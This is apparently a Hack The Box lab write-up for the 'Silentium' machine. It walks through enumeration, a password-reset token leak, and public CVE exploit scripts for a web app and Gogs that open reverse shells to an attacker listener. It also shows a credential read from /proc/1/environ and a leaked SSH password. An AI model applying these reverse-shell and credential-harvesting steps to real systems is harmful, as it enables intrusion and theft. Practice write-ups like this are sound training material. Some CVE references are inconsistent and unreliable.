# Hack The Box - Silentium Writeup
![alt text](.images/image.png)

# information gathering
 1. enumeration with Nmap 
 ```bash
nmap -sC -sV 10.129.75.175
Starting Nmap 7.95 ( https://nmap.org ) at 2026-08-19 11:23 EDT
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing Script 
NSE Timing: About 98.95% done; ETC: 11:23 (0:00:00 remaining)
Nmap scan report for 10.129.75.175
Host is up (0.011s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
				22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
|_http-server-header: nginx/1.24.0 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- Ports 22 and 80 are open. We should check port 80 first to identify the web technology running on it 

### 2. enumeration with technology web 

![alt text](<.images/Pasted image 20260819162631.png>)

- Checking Wappalyzer didn't reveal anything useful, so let me explore the website directly.

## web enumeration
### A.Next let's explore the website manually

![alt text](<.images/Pasted image 20260819231343.png>)

- The homepage looks like a standard website. Next, we need to understand how the site works, what its purpose is, and look for any hidden flaws or vulnerabilities.

- I only found information about the manager and a few users. This data might be useful for us later
### B.enumeration with ffuf

- **ffuf** is a fast web fuzzing tool used for brute-forcing files, directories, subdomains, and virtual hosts (vhosts).

- **`-u`**: Specifies the target URL.
    
- **`-w`**: Specifies the path to the wordlist

- **`-c`**: color response
    
- **`-v`**: full URL

![alt text](<.images/Pasted image 20260819233723.png>)

We found many files and directories, but they all appear to be false positives. Looking closely at the response size, every result returns a size of **8853**

```bash
‎ffuf -u http://silentium.htb/FUZZ -w /usr/share/wordlists/dirb/big.txt -c -v 
```

-  To remove these false positives, let's filter responses with a size of 8853 using the `-fs 8853` flag
	**`-fs`**: filter size
	
![alt text](<.images/Pasted image 20260819235714.png>)

```bash
ffuf -u http://silentium.htb/FUZZ -w /usr/share/wordlists/dirb/big.txt -c -v -fs 8753
```

No valid paths were found. Next, we will perform vhost enumeration to discover hidden subdomains or virtual hosts

![alt text](<.images/Pasted image 20260820000701.png>)

Once again, we received false positives. We need to update the `-fs` flag with the new response size.

**`-H`**: Specifies a custom HTTP header (used here to set the `Host` header)

```bash
ffuf -u http://silentium.htb/ -H "Host:FUZZ.silentium.htb" -w /usr/share/wordlists/dirb/big.txt -c -v 
```

Filter Size command 

```bash
ffuf -u http://silentium.htb/ -H "Host:FUZZ.silentium.htb" -w /usr/share/wordlists/dirb/big.txt -c -v -fs 178
```

![alt text](<.images/Pasted image 20260820220437.png>)

- so we found something useful we have a stagins let's put the vhost on the   ***`/etc/hosts`***
# information gathering and exploit 

### C.we have a login page

![alt text](<.images/Pasted image 20260820230316.png>)

1. i user a random credanctio and i found user not found the is very help full for us


![alt text](<.images/Pasted image 20260820230459.png>)

2. Recalling the usernames **Ben** , **Marcus** and **Thorne** found earlier, I will use these credentials to attempt a login.

![alt text](<.images/Pasted image 20260820230831.png>)

3. Next, I tested the following credentials:
		**`ben@silentium.htb`**
		**`Elena@silentium.htb`**
		**`Marcus@silentium.htb`**

	1. As shown in the image below the login attempt returned an **"Incorrect Email or Password"** error instead of **"User not found"** This confirms a different response behavior
		- i try **`ben@silentium.htb`** it's work

        ![alt text](<.images/Pasted image 20260820231824.png>)
        - I tried testing the email **`Elena@silentium.htb`**, but it didn't work.

        ![alt text](<.images/Pasted image 20260820232609.png>)

        - Finally, I tested **`Marcus@silentium.htb`**, but that didn't work again

        ![alt text](<.images/Pasted image 20260820232900.png>)

# misconfiguration on the webapplication 

### We identified a vulnerability in the password reset function.

1. Click on **Forgot Password**, enter `ben@silentium.htb`, and ensure Burp Suite is running with the interceptor enabled to capture the request

![alt text](<.images/Pasted image 20260820234030.png>)

2. Send the request to **Repeater**, click **Send**, and you will see the response below:

![alt text](<.images/Pasted image 20260819164413.png>)

3. Copy the token from the response and save it in a text editor for later use.
- and go to ***change your password here***

![alt text](<.images/Pasted image 20260822222443.png>)

4. Enter `ben@silentium.htb` and the extracted token into the respective input fields.
password123@LP

![alt text](<.images/Pasted image 20260822220456.png>)

5. Now, navigate back to the login page and authenticate with the email `ben@silentium.htb` and the new password

# exploit vulnerability on the web target

### enumeration web
1. After logging in, turn off the Burp Suite proxy interceptor to load the page properly and view the application version

![alt text](<.images/Pasted image 20260822225207.png>)

2. and if see the version of the web you will be see the 3.0.5

![alt text](<.images/Pasted image 20260822225532.png>)

3. Next, I searched online for the application name and version **3.0.5**, appending "CVE" to the query to identify known publicly disclosed vulnerabilities.

![alt text](<.images/Pasted image 20260822225059.png>)

4. The Proof of Concept (PoC) for this vulnerability can be found at the link below

You can download the exploit script by scrolling up to find `CVE-2025-59528.py` at the top or use the command blower

```bash
git clone https://github.com/TrevoCastles/HackTheBox-Silentium Writeup.git
```



- you can use a normal shell 

```bash
‎nc -lvnp 4444
```

- or you can use smrart shell he give you advanced futcher 

```bash
‎sudo apt install penelope

‎‎penelope -i tun0 -p 4444
```


- run the code to expolit the vulnabolity 

```bash
python3 CVE-2025-58434.py \
  -u http://example.example.com \
  -e admin@example.com \
  --lhost 10.10.10.10 \
  --lport 4444
```

5. bom we are root actacaly we are not root yat but we have acceac to root on the servec

![alt text](<.images/Pasted image 20260823211223.png>)

if enumration the machin you will be see the credanshel blower so we need to use ssh to see the is the credamchal is true or not 

```bash
‎cat /proc/1/environ | tr '\0' '\n'
```

![alt text](<.images/Pasted image 20260825200636.png>)

- so we have a ben and password let's see if the credacncal is true 

```bash
‎ssh ben@10.10.10.10 
```

‎node@10.129.83.56's password:``r04D!!_R4ge``


![alt text](<.images/Pasted image 20260827233956.png>)

```bash
‎ben@silentium:~$ ls
‎user.txt
‎ben@silentium:~$ cat user.txt 
‎HTB{.............................}
‎ben@silentium:~$ 
```

# Privilege Escalation

### eumration the machin 

-  we will use anything to see if have a missconfigration or CVE 
1. use command blower to see if the user can run something a root 
```bash
sudo -l
```

 - no useful result 
```bash
‎ben@silentium:~$ sudo -l
‎[sudo] password for ben: 
‎Sorry, user ben may not run sudo on silentium.
```

---
2. let's see the server have a permssion S use the command blower 

```bash
‎‎find / -perm -4000 2>/dev/null
```

- again noting nothing

```
/usr/bin/gpasswd
/usr/bin/umount
/usr/bin/chfn
/usr/bin/fusermount3
/usr/bin/newgrp
/usr/bin/sudo
/usr/bin/mount
/usr/bin/su
/usr/bin/chsh
/usr/bin/passwd
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/polkit-1/polkit-agent-helper-1
/usr/lib/openssh/ssh-keysign

```


---
3. so now we need to try what is service run on the localhost type the command blower

```bash
‎sudo ss -tulpn
```

```bash
Netid          State           Recv-Q          Send-Q       
udp            UNCONN          0               0     127.0.0.54:53                          
udp            UNCONN          0               0     127.0.0.53%lo:53                                           
udp            UNCONN          0               0      0.0.0.0:68                                 
tcp            LISTEN          0               4096   127.0.0.1:8025                              
tcp            LISTEN          0               4096   127.0.0.54:53                             
tcp            LISTEN          0               4096   127.0.0.1:1025                            
tcp            LISTEN          0               4096   127.0.0.1:3000                                
tcp            LISTEN          0               4096   127.0.0.1:3001                                 
tcp            LISTEN          0               4096   127.0.0.1:39481                         
tcp            LISTEN          0               4096   127.0.0.53%lo:53                              
tcp            LISTEN          0               4096    0.0.0.0:22                               
tcp            LISTEN          0               511     0.0.0.0:80                             
tcp            LISTEN          0               4096                              
tcp            LISTEN          0               511 
```

- so we have some port run on the localhost so we need to move't on machin kali

use the command blower to forwarding port in you machine kali 

```bash
ssh -L 8082:localhost:3001 ben@10.129.92.195
```
![alt text](<.images/Pasted image 20260910001801.png>)

- we have a webapplication GOgs he name you need to create a account to see what insed web

```bash
ben@silentium:~$ cd ..
ben@silentium:/home$ ls
ben
ben@silentium:/home$ cd /opt/
ben@silentium:/opt$ ls
containerd  gogs
ben@silentium:/opt$ cd gogs/
ben@silentium:/opt/gogs$ ls
custom  data  gogs  log
ben@silentium:/opt/gogs$ cd gogs/
ben@silentium:/opt/gogs/gogs$ ls
custom  data  gogs  LICENSE  log  README.md  README_ZH.md  scripts
ben@silentium:/opt/gogs/gogs$ ./gogs --version 
Gogs version 0.13.3

```

- so we have a version for GOGS : 0.13.3 

### exploit GOGS

![alt text](<.images/Pasted image 20260910222159.png>)

we have a ****CVE-2025-8110**** 

**Disclaimer:** This script is for educational purposes and authorized security testing only. Do not use it against systems you do not own or have permission to test.

- You can download the exploit script by scrolling up to find `CVE-2025-8110.py` at the top or use the command blower

```bash
git clone https://github.com/TrevoCastles/HackTheBox-Silentium Writeup.git
```



```python
python3 -m venv myenv

source myenv/bin/activate

pip install -r requirements.txt
```

```bash
nc -lvnp 5555
```

```bash
python3 CVE-2025-8110.py -u <TARGET_URL> -lh <ATTACKER_IP> -lp <ATTACKER_PORT>
```

![alt text](<.images/Pasted image 20260910230654.png>)

![alt text](<.images/Pasted image 20260910230730.png>)

thank you @hachthebox for the machine
